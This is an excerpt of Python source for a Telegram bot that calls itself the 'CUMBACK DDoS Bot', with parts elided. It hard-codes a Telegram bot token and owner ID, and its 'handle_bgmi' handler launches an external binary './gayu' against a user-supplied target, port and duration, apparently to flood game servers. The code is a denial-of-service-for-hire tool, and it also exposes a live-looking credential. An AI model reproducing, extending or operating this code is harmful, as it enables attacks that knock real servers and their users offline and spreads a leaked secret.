...
OWNER_ID = "1221262658"
bot = telebot.TeleBot('7081517613:AAEckyBnCcrY-y17SjcP63DR3oXcddNTPow')
...
def start_command(message):
    welcome_message = """
🌟 Welcome to the <b>CUMBACK DDoS Bot</b>! 🌟
...
🛡️ For assistance, contact <a href="tg://user?id=1221262658">@iNSANE_010</a>
...
def handle_bgmi(message):
    ...
    try:
        subprocess.Popen(
           ["./gayu", target, str(port), str(duration), "1200" ],
